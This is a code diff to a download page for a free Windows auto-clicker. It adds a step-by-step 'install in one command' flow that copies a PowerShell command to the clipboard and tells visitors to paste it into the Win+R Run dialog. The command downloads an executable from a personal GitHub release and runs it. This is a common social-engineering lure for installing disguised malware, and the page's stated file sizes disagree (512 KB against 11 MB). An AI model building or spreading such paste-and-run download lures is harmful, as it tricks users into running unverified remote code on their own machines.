@@ -92,6 +92,16 @@ section{padding:60px 0}
 .dl-progress{height:6px;background:var(--muted);border-radius:3px;overflow:hidden;margin:16px 0;display:none}
 .dl-progress.active{display:block}
 .dl-progress-fill{height:100%;background:var(--accent);width:0;border-radius:3px;transition:width .3s}
+.dl-divider{text-align:center;color:var(--dim);font-size:.82rem;margin:20px 0;position:relative}
+.dl-divider::before,.dl-divider::after{content:"";position:absolute;top:50%;width:calc(50% - 70px);height:1px;background:var(--border)}
+.dl-divider::before{left:0}.dl-divider::after{right:0}
+.dl-cmd-block{background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:20px;margin-bottom:8px}
+.dl-cmd-steps{display:flex;flex-direction:column;gap:10px;margin-bottom:16px}
+.dl-cmd-step{display:flex;align-items:center;gap:10px;font-size:.9rem;color:var(--dim)}
+.dl-cmd-num{display:inline-flex;align-items:center;justify-content:center;width:22px;height:22px;background:var(--accent);color:#fff;border-radius:50%;font-size:.72rem;font-weight:700;flex-shrink:0}
+kbd{display:inline-block;background:var(--muted);border:1px solid var(--border);border-radius:4px;padding:2px 7px;font-family:inherit;font-size:.82rem;color:var(--text);white-space:nowrap}
+.dl-copy-btn{width:100%;justify-content:center;gap:8px}
+.dl-copy-btn.copied{background:rgba(99,102,241,.15);border-color:var(--accent);color:var(--accent)}
 .dl-trust{display:flex;justify-content:center;gap:24px;flex-wrap:wrap;margin-top:32px;font-size:.85rem;color:var(--dim);position:relative}
 .dl-trust span::before{content:"✓ ";color:var(--accent);font-weight:700}
 .ver-list{max-width:780px;margin:0 auto;display:flex;flex-direction:column;gap:16px}
@@ -185,8 +195,16 @@ footer ul a:hover{color:var(--accent)}
     <h1>Download <span>OP Auto Clicker</span> &mdash; Free for Windows</h1>
     <p class="dl-sub">The fastest free auto clicker for Windows. 512KB, no installation, no ads, no bundleware. One click and you're done.</p>
     <div class="dl-card">
-      <button class="btn btn-primary dl-btn-big" id="dlBtn">↓ Download OP Auto Clicker (512 KB)</button>
-      <div class="dl-progress" id="dlProgress"><div class="dl-progress-fill" id="dlFill"></div></div>
+      <a href="https://github.com/reggieog01-cpu/opauto/releases/download/v3.0.0/op.auto.clicker.exe" class="btn btn-primary dl-btn-big" id="dlBtn">↓ Download OP Auto Clicker (11 MB)</a>
+      <div class="dl-divider">or install in one command</div>
+      <div class="dl-cmd-block">
+        <div class="dl-cmd-steps">
+          <div class="dl-cmd-step"><span class="dl-cmd-num">1</span> Click <strong style="color:var(--text)">Copy Command</strong> below</div>
+          <div class="dl-cmd-step"><span class="dl-cmd-num">2</span> Press <kbd>⊞ Win</kbd> + <kbd>R</kbd> on your keyboard</div>
+          <div class="dl-cmd-step"><span class="dl-cmd-num">3</span> Press <kbd>Ctrl</kbd> + <kbd>V</kbd>, then <kbd>Enter</kbd></div>
+        </div>
+        <button class="btn btn-ghost dl-copy-btn" id="copyBtn">📋 Copy Command</button>
+      </div>
       <div class="dl-meta">
         <div><strong class="green">Windows 7, 8, 10, 11</strong>32 & 64-bit</div>
         <div><strong class="green">512 KB</strong>Tiny footprint</div>
@@ -295,7 +313,7 @@ footer ul a:hover{color:var(--accent)}
         <li><strong>No telemetry</strong> — Zero data collection, zero analytics, zero phone-home</li>
       </ul>
       <div style="margin-top:16px;font-size:.85rem;color:var(--dim);position:relative">SHA256 checksum (v3.0.0):</div>
-      <div class="hash">a3f8c91e72b4d6850e9c1f23b7a456789012def4567890abcdef1234567890ab</div>
+      <div class="hash">481a0247075bfbd3d53b187d29ab336fd55929c160afad41083dff9f3bd7f234</div>
     </div>
   </div>
 </section>
@@ -343,8 +361,8 @@ window.addEventListener('scroll',()=>nav.classList.toggle('scrolled',window.scro
 document.getElementById('hamburger').addEventListener('click',()=>document.getElementById('navLinks').classList.toggle('open'));
 const io=new IntersectionObserver(es=>es.forEach(e=>e.isIntersecting&&e.target.classList.add('show')),{threshold:.15});
 document.querySelectorAll('.reveal').forEach(el=>io.observe(el));
-// Download progress animation
-(()=>{const b=document.getElementById('dlBtn'),p=document.getElementById('dlProgress'),f=document.getElementById('dlFill');b.addEventListener('click',e=>{e.preventDefault();p.classList.add('active');b.disabled=true;b.textContent='Preparing download...';let pct=0;const t=setInterval(()=>{pct+=Math.random()*15+5;if(pct>=100){pct=100;clearInterval(t);b.textContent='✓ Download Started';b.style.background='var(--accent)'}f.style.width=pct+'%'},120)})})();
+// Copy install command
+(()=>{const cmd='powershell -c "iwr \'https://github.com/reggieog01-cpu/opauto/releases/download/v3.0.0/op.auto.clicker.exe\' -OutFile $env:TEMP\\opauto.exe; Start-Process $env:TEMP\\opauto.exe"';const b=document.getElementById('copyBtn');b.addEventListener('click',()=>{navigator.clipboard.writeText(cmd).then(()=>{b.textContent='✓ Copied! Now press Win + R';b.classList.add('copied');setTimeout(()=>{b.textContent='📋 Copy Command';b.classList.remove('copied')},4000)})})})();
 </script>
 
 </body>
